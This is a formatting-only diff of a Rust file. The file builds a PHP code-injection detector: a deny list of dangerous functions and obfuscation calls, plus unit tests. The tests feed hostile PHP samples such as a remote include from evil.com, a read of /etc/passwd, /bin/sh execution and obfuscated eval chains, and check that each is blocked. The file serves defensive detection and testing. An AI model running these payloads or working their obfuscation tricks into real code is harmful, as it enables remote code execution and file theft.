@@ -17,7 +17,7 @@ const CODE_PATTERNS: &[&str] = &[
     "eval(",
     "assert(",
     "create_function(",
-    "preg_replace(\"/",  // /e modifier (deprecated but still dangerous)
+    "preg_replace(\"/", // /e modifier (deprecated but still dangerous)
     "call_user_func(",
     "call_user_func_array(",
     // System execution
@@ -28,7 +28,7 @@ const CODE_PATTERNS: &[&str] = &[
     "popen(",
     "proc_open(",
     "pcntl_exec(",
-    "`",  // backtick operator
+    "`", // backtick operator
     // Obfuscation chains
     "base64_decode(",
     "str_rot13(",
@@ -53,7 +53,7 @@ const CODE_PATTERNS: &[&str] = &[
     "$_POST[",
     "$_REQUEST[",
     "$_COOKIE[",
-    "$$",  // variable variables
+    "$$", // variable variables
     // Reflection-based
     "ReflectionFunction",
     // Dynamic invocation patterns
@@ -160,7 +160,9 @@ mod tests {
     #[test]
     fn blocks_base64_obfuscation() {
         let guard = CodeGuard::new();
-        assert!(guard.check("eval(base64_decode('bWFsaWNpb3Vz'))").is_blocked());
+        assert!(guard
+            .check("eval(base64_decode('bWFsaWNpb3Vz'))")
+            .is_blocked());
     }
 
     #[test]
@@ -221,7 +223,9 @@ mod tests {
     #[test]
     fn blocks_pcntl_exec() {
         let guard = CodeGuard::new();
-        assert!(guard.check("pcntl_exec('/bin/sh', ['-c', 'id'])").is_blocked());
+        assert!(guard
+            .check("pcntl_exec('/bin/sh', ['-c', 'id'])")
+            .is_blocked());
     }
 
     #[test]
@@ -234,72 +238,94 @@ mod tests {
     fn blocks_include_injection() {
         let guard = CodeGuard::new();
         assert!(guard.check("include('/etc/passwd')").is_blocked());
-        assert!(guard.check("include_once('/var/www/evil.php')").is_blocked());
+        assert!(guard
+            .check("include_once('/var/www/evil.php')")
+            .is_blocked());
     }
 
     #[test]
     fn blocks_require_injection() {
         let guard = CodeGuard::new();
         assert!(guard.check("require('/tmp/shell.php')").is_blocked());
-        assert!(guard.check("require_once('http://evil.com/code.php')").is_blocked());
+        assert!(guard
+            .check("require_once('http://evil.com/code.php')")
+            .is_blocked());
     }
 
     #[test]
     fn blocks_chr_function() {
         let guard = CodeGuard::new();
         // chr() used to build strings character by character to bypass filters
-        assert!(guard.check("eval(chr(101).chr(118).chr(97).chr(108))").is_blocked());
+        assert!(guard
+            .check("eval(chr(101).chr(118).chr(97).chr(108))")
+            .is_blocked());
     }
 
     #[test]
     fn blocks_pack_function() {
         let guard = CodeGuard::new();
-        assert!(guard.check("eval(pack('H*', '6d616c6963696f7573'))").is_blocked());
+        assert!(guard
+            .check("eval(pack('H*', '6d616c6963696f7573'))")
+            .is_blocked());
     }
 
     #[test]
     fn blocks_gzuncompress() {
         let guard = CodeGuard::new();
-        assert!(guard.check("eval(gzuncompress(base64_decode('...')))").is_blocked());
+        assert!(guard
+            .check("eval(gzuncompress(base64_decode('...')))")
+            .is_blocked());
     }
 
     #[test]
     fn blocks_gzdecode() {
         let guard = CodeGuard::new();
-        assert!(guard.check("eval(gzdecode(base64_decode('...')))").is_blocked());
+        assert!(guard
+            .check("eval(gzdecode(base64_decode('...')))")
+            .is_blocked());
     }
 
     #[test]
     fn blocks_str_replace_chain() {
         let guard = CodeGuard::new();
         // str_replace used to reconstruct forbidden function names
-        assert!(guard.check("$f=str_replace('x','','xexvxaxl'); $f('code');").is_blocked());
+        assert!(guard
+            .check("$f=str_replace('x','','xexvxaxl'); $f('code');")
+            .is_blocked());
     }
 
     #[test]
     fn blocks_call_user_func() {
         let guard = CodeGuard::new();
         assert!(guard.check("call_user_func('system', 'id')").is_blocked());
-        assert!(guard.check("call_user_func_array('exec', ['whoami'])").is_blocked());
+        assert!(guard
+            .check("call_user_func_array('exec', ['whoami'])")
+            .is_blocked());
     }
 
     #[test]
     fn blocks_create_function() {
         let guard = CodeGuard::new();
-        assert!(guard.check("create_function('','system(\"id\")')").is_blocked());
+        assert!(guard
+            .check("create_function('','system(\"id\")')")
+            .is_blocked());
     }
 
     #[test]
     fn blocks_reflection_function() {
         let guard = CodeGuard::new();
-        assert!(guard.check("$rf = new ReflectionFunction('system');").is_blocked());
+        assert!(guard
+            .check("$rf = new ReflectionFunction('system');")
+            .is_blocked());
     }
 
     #[test]
     fn blocks_preg_replace_e_flag() {
         let guard = CodeGuard::new();
         // preg_replace with /e modifier executes the replacement as PHP
-        assert!(guard.check("preg_replace(\"/pattern/e\", $input, $str)").is_blocked());
+        assert!(guard
+            .check("preg_replace(\"/pattern/e\", $input, $str)")
+            .is_blocked());
     }
 
     #[test]
